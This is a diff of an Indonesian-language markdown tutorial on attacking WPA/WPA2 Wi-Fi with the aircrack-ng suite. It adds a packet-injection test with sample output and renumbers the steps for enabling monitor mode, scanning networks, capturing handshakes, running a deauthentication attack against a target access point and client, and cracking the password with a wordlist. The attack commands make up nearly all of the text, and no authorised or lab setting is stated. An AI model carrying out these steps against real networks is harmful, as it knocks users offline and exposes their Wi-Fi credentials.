@@ -303,19 +303,7 @@ ip addr show wlan1
 sudo airmon-ng
 ```
 
-#### 2. Cek proses yang mengganggu mode monitor:
-
-```bash
-sudo airmon-ng check
-```
-
-#### 3. Matikan proses yang mengganggu mode monitor:
-
-```bash
-sudo airmon-ng check kill
-```
-
-#### 4. Aktifkan mode monitor:
+#### 2. Aktifkan mode monitor:
 
 ```bash
 sudo airmon-ng start wlan2
@@ -323,25 +311,39 @@ sudo airmon-ng start wlan2
 
 Setelah mode monitor aktif, nama interface `wlan2` akan berubah menjadi `wlan2mon`.
 
-#### 5. Scan jaringan Wi-Fi WPA/WPA2:
+#### 3. Tes packet injection:
+
+```
+sudo aireplay-ng -9 wlan2mon
+```
+
+Output:
+
+```
+23:20:33  Trying broadcast probe requests...
+23:20:33  Injection is working!
+23:20:35  Found 1 AP
+```
+
+#### 4. Scan jaringan Wi-Fi WPA/WPA2:
 
 ```bash
 sudo airodump-ng -t wpa wlan2mon
 ```
 
-#### 6. Capture handshake WPA/WPA2:
+#### 5. Capture handshake WPA/WPA2:
 
 ```bash
 sudo airodump-ng -d [bssid] -c [channel] -w [output] wlan2mon
 ```
 
-#### 7. Jalankan serangan deauth:
+#### 6. Jalankan serangan deauth:
 
 ```bash
 sudo aireplay-ng -0 10 -a [bssid] -c [mac_client] wlan2mon
 ```
 
-#### 8. Crack password WPA/WPA2:
+#### 7. Crack password WPA/WPA2:
 
 ```bash
 aircrack-ng -a 2 [file_capture] -w [wordlist]
